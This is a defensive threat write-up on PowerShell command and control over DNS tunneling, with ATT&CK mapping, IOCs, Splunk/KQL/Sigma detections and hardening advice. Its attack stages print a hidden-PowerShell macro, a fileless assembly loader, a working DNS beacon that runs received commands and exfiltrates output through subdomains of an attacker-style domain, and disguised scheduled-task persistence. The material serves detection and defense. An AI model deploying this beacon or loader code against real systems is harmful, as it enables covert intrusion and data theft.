# Attack Chain: PowerShell-Based C2 via DNS Tunneling

## Executive Summary

This document describes an attack chain where adversaries use PowerShell to implement command and control (C2) communications over DNS tunneling. DNS is a protocol that is rarely blocked at the network perimeter, making it an effective covert channel for exfiltration and persistent C2. This technique is used by both nation-state actors (APT32, APT34) and commodity malware (DNSMessenger, Nishang).

---

## Technique Overview

Adversaries abuse DNS by encoding C2 traffic inside DNS queries and responses. A victim machine running malware sends queries for attacker-controlled subdomains; encoded data is embedded in the subdomain label (e.g., `<base64-payload>.c2.attacker.com`). The attacker's authoritative DNS server decodes the query, processes the command, and returns encoded responses in DNS record types such as TXT, CNAME, or MX records.

PowerShell is the preferred implementation vehicle on Windows due to its native network capabilities (`System.Net.Dns`), script execution flexibility, and the ability to operate entirely in-memory without writing payloads to disk.

**Why DNS:**
- Port 53 (UDP/TCP) is permitted through most firewalls outbound
- DNS traffic blends with legitimate activity
- Many organizations lack DNS traffic inspection
- Responses can carry arbitrary data in TXT, NULL, CNAME record fields

---

## MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Sub-Technique |
|--------|--------------|----------------|---------------|
| Initial Access | T1566.001 | Phishing: Spearphishing Attachment | — |
| Execution | T1059.001 | Command and Scripting Interpreter: PowerShell | — |
| Defense Evasion | T1027 | Obfuscated Files or Information | — |
| Defense Evasion | T1140 | Deobfuscate/Decode Files or Information | — |
| Defense Evasion | T1562.001 | Impair Defenses: Disable or Modify Tools | — |
| Persistence | T1053.005 | Scheduled Task/Job: Scheduled Task | — |
| Command and Control | T1071.004 | Application Layer Protocol: DNS | DNS |
| Command and Control | T1132.001 | Data Encoding: Standard Encoding | Base64 |
| Command and Control | T1008 | Fallback Channels | — |
| Exfiltration | T1048.003 | Exfiltration Over Alternative Protocol: Unencrypted | — |

---

## Attack Chain

### Stage 1 — Initial Access

**Vector:** Spearphishing email with a malicious Office document or LNK file.

The document contains a macro or embedded OLE object that, when enabled by the victim, spawns a PowerShell process.

**Example macro stub:**
```vba
Sub AutoOpen()
    Dim cmd As String
    cmd = "powershell.exe -NoP -NonI -W Hidden -Enc <base64-encoded-stager>"
    Shell cmd
End Sub
```

**Artifacts:**
- Child process of `WINWORD.EXE` or `EXCEL.EXE` spawning `powershell.exe`
- `-Enc` or `-EncodedCommand` flag in process command line

---

### Stage 2 — Execution & Stager Delivery

**PowerShell stager execution:** The encoded PowerShell command downloads or decodes a second-stage DNS tunnel implant, loading it directly into memory.

**Example stager (simplified):**
```powershell
# Decode and load DNS tunnel agent entirely in-memory
$encoded = "<base64-encoded-implant>"
$bytes   = [Convert]::FromBase64String($encoded)
$asm     = [System.Reflection.Assembly]::Load($bytes)
$asm.EntryPoint.Invoke($null, $null)
```

Key behaviors:
- PowerShell with `-NoProfile`, `-NonInteractive`, `-WindowStyle Hidden`
- Use of `[Convert]::FromBase64String` or custom XOR decoding
- No file written to disk (fileless execution)
- `AMSI` bypass attempts via memory patching or obfuscation

---

### Stage 3 — Establishing DNS C2 Channel

**Attacker infrastructure:** The adversary pre-registers a domain (e.g., `updates-cdn[.]net`) and configures an authoritative nameserver running a custom DNS server (e.g., `dnscat2`, `iodine`, or a bespoke Python listener).

**Victim-side implant behavior:**

1. Implant generates a session ID (random hex)
2. Commands are requested by querying a subdomain:
   ```
   <session_id>.<encoded_command_index>.c2.updates-cdn[.]net  →  TXT record response
   ```
3. Output is exfiltrated by encoding data as subdomain labels:
   ```
   <base64_chunk_1>.<session_id>.out.updates-cdn[.]net  →  A record (ignored)
   ```

**PowerShell DNS query example:**
```powershell
function Invoke-DNSQuery {
    param([string]$Query)
    try {
        $result = [System.Net.Dns]::GetHostEntry($Query)
        return $result.AddressList[0].IPAddressToString
    } catch {
        # Fallback: use nslookup via Invoke-Expression
        $r = nslookup -type=TXT $Query 2>&1
        return ($r | Select-String '"(.+)"').Matches.Groups[1].Value
    }
}

# Beacon loop
while ($true) {
    $sessionId = "a3f9"
    $cmd = Invoke-DNSQuery "$sessionId.cmd.updates-cdn.net"
    if ($cmd -ne "0.0.0.0") {
        $output = Invoke-Expression ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($cmd)))
        # Exfiltrate output in chunks via subdomains
        $chunks = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($output)) -split "(.{40})" | Where-Object {$_}
        foreach ($chunk in $chunks) {
            [System.Net.Dns]::GetHostEntry("$chunk.$sessionId.out.updates-cdn.net") | Out-Null
        }
    }
    Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 120)
}
```

---

### Stage 4 — Persistence

The implant installs a scheduled task to survive reboots:

```powershell
$action  = New-ScheduledTaskAction -Execute "powershell.exe" `
             -Argument "-NoP -NonI -W Hidden -Enc <stager_base64>"
$trigger = New-ScheduledTaskTrigger -AtLogOn
Register-ScheduledTask -TaskName "WindowsUpdateCheck" `
                       -Action $action -Trigger $trigger `
                       -RunLevel Highest -Force
```

**Artifacts:**
- Scheduled task with generic name (`WindowsUpdateCheck`, `MicrosoftEdgeUpdate`)
- Task action invoking `powershell.exe` with `-Enc` flag
- Task registered under `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache`

---

### Stage 5 — Command Execution & Exfiltration

The adversary issues commands through the DNS C2 channel. Common objectives:

| Objective | Technique |
|-----------|-----------|
| Credential access | `Invoke-Mimikatz` / `sekurlsa::logonpasswords` |
| Lateral movement | `Invoke-SMBExec`, `Enter-PSSession` |
| Discovery | `net user /domain`, `Get-ADComputer` |
| Data staging | Compress and base64-encode files |
| Exfiltration | Chunk and encode data into DNS queries |

---

## Indicators of Compromise (IOCs)

### Network Indicators

| Type | Value | Notes |
|------|-------|-------|
| DNS pattern | `*.*.*.attacker-domain.tld` | High-entropy subdomains, 3+ labels |
| DNS record type | Frequent TXT record queries | Unusual for workstations |
| Query volume | >100 DNS queries/min to single domain | Beaconing pattern |
| Subdomain entropy | Shannon entropy >3.5 on subdomain labels | Base64/hex encoding |
| DNS TTL | Very low TTL (0–1s) on responses | Dynamic C2 infrastructure |

### Host Indicators

| Type | Value |
|------|-------|
| Process | `powershell.exe` with `-Enc`, `-NoP`, `-NonI`, `-W Hidden` |
| Parent process | `powershell.exe` child of `winword.exe`, `excel.exe`, `wscript.exe` |
| Memory | Reflectively loaded .NET assembly with no on-disk artifact |
| Registry | Scheduled task entry with encoded PowerShell argument |
| Event Log | PowerShell `ScriptBlock` logging event 4104 with encoded content |

### PowerShell Script Block Patterns

```
[System.Net.Dns]::GetHostEntry
[System.Net.Dns]::GetHostAddresses
Invoke-Expression.*Base64
[Convert]::FromBase64String
Start-Sleep.*Get-Random
```

---

## Detection Logic

### Detection 1 — High-Entropy DNS Subdomain Queries (Network)

**Platform:** DNS proxy / SIEM (Splunk, Sentinel, Chronicle)

**Logic:**
```spl
index=dns sourcetype=dns_logs
| eval subdomain=mvindex(split(query, "."), 0)
| eval entropy=calculate_entropy(subdomain)
| where entropy > 3.5 AND query_type="TXT"
| stats count by src_ip, query, entropy
| where count > 20
| sort -entropy
```

**Rationale:** Legitimate DNS subdomains have low entropy. Base64 or hex-encoded data in subdomains has entropy >3.5. Filtering on TXT record queries further reduces false positives since workstations rarely query TXT records.

---

### Detection 2 — Excessive DNS Queries to Single Domain (Network)

**Platform:** Network monitoring / NDR

**Logic (KQL / Sentinel):**
```kql
DnsEvents
| where QueryType == "TXT" or SubDomain contains "."
| summarize QueryCount = count(), UniqueSubdomains = dcount(Name)
    by bin(TimeGenerated, 5m), ClientIP, tostring(split(Name, ".")[-2])
| where QueryCount > 100 and UniqueSubdomains > 50
| project TimeGenerated, ClientIP, Domain, QueryCount, UniqueSubdomains
```

**Rationale:** Beaconing implants generate hundreds of DNS queries with unique subdomain prefixes. Normal clients make far fewer queries per domain.

---

### Detection 3 — PowerShell Encoded Command Execution (Host)

**Platform:** Windows Event Log / EDR (Event ID 4104)

**Sigma Rule:**
```yaml
title: PowerShell Encoded Command with Network DNS Activity
id: 8f2d3a1b-4c5e-4f6a-9b0c-1d2e3f4a5b6c
status: experimental
description: Detects PowerShell launched with encoded commands that subsequently
  perform DNS lookups, indicative of DNS C2 tunneling
logsource:
  product: windows
  category: process_creation
detection:
  selection_ps:
    Image|endswith: '\powershell.exe'
    CommandLine|contains:
      - '-Enc '
      - '-EncodedCommand '
  selection_flags:
    CommandLine|contains:
      - '-NoP'
      - '-NonI'
      - '-W Hidden'
      - '-WindowStyle Hidden'
  condition: selection_ps and selection_flags
falsepositives:
  - Legitimate software deployment tools using encoded PowerShell
  - SCCM/Intune management scripts
level: medium
tags:
  - attack.execution
  - attack.t1059.001
  - attack.defense_evasion
  - attack.t1027
```

---

### Detection 4 — In-Memory .NET Assembly Load (Host)

**Platform:** EDR / PowerShell Script Block Logging (Event ID 4104)

**Logic:**
```spl
index=wineventlog EventCode=4104
| where match(ScriptBlockText, "\[System\.Reflection\.Assembly\]::Load")
   AND match(ScriptBlockText, "FromBase64String")
| table _time, host, UserID, ScriptBlockText
```

**Rationale:** Reflective loading of .NET assemblies from base64-decoded bytes is a primary technique for fileless execution of DNS implants. This combination is rarely seen in legitimate scripts.

---

### Detection 5 — Scheduled Task with Encoded PowerShell (Host)

**Platform:** Windows Security Event Log / Sysmon Event ID 1

**Logic (KQL):**
```kql
Event
| where EventID == 4698  // Scheduled task created
| extend TaskXml = EventData
| where TaskXml contains "powershell" and TaskXml contains "-Enc"
| project TimeGenerated, Computer, Account, TaskXml
```

**Rationale:** Persistence via scheduled task is common for DNS implants that need to survive reboots. The combination of `powershell.exe` with `-Enc` in task arguments is a high-confidence indicator.

---

### Detection 6 — PowerShell DNS API Usage (Host)

**Platform:** PowerShell Script Block Logging (Event ID 4104)

**Logic:**
```spl
index=wineventlog EventCode=4104
| where match(ScriptBlockText, "\[System\.Net\.Dns\]::(GetHostEntry|GetHostAddresses|Resolve)")
   AND match(ScriptBlockText, "(Invoke-Expression|iex|Start-Sleep|Get-Random)")
| stats count by host, UserID
| where count > 5
```

**Rationale:** Legitimate scripts rarely combine `System.Net.Dns` calls with `Invoke-Expression` and `Start-Sleep`/`Get-Random` (beaconing sleep jitter). This combination strongly indicates a DNS C2 beacon loop.

---

## Defensive Recommendations

| Control | Description |
|---------|-------------|
| DNS sinkholing | Route newly registered domains and high-entropy hostnames to a sinkhole |
| DNS inspection | Deploy a DNS security solution (Cisco Umbrella, Infoblox BloxOne) to inspect and log all DNS traffic |
| PowerShell Constrained Language Mode | Enable CLM via AppLocker or WDAC to restrict reflection and full .NET access |
| Script Block Logging | Enable PowerShell ScriptBlock Logging (Event ID 4104) and Module Logging (Event ID 4103) across all endpoints |
| AMSI | Ensure AMSI is enabled and integrated with AV/EDR; monitor for AMSI bypass attempts |
| Execution policy | Enforce `AllSigned` or `RemoteSigned` execution policy and block `-ExecutionPolicy Bypass` |
| Egress filtering | Block or proxy DNS queries to external resolvers; only permit DNS to internal resolvers |
| Anomaly detection | Baseline DNS query rates per host; alert on hosts exceeding 2 standard deviations |

---

## References

- [MITRE ATT&CK T1071.004 - DNS](https://attack.mitre.org/techniques/T1071/004/)
- [MITRE ATT&CK T1059.001 - PowerShell](https://attack.mitre.org/techniques/T1059/001/)
- [MITRE ATT&CK T1132.001 - Standard Encoding](https://attack.mitre.org/techniques/T1132/001/)
- [NSA/CISA Advisory: PowerShell Security](https://media.defense.gov/2022/Jun/22/2003021689/-1/-1/1/CSI_KEEPING_POWERSHELL_SECURITY_MEASURES_TO_USE_AND_EMBRACE_20220622.PDF)
- [dnscat2 - DNS C2 Tool](https://github.com/iagox86/dnscat2)
- [DNSMessenger Analysis - Talos](https://blog.talosintelligence.com/dnsmessenger/)
- [Hunting for DNS Tunneling - Palo Alto Unit 42](https://unit42.paloaltonetworks.com/dns-tunneling-in-the-wild-overview-of-oilrigs-dns-tunneling/)
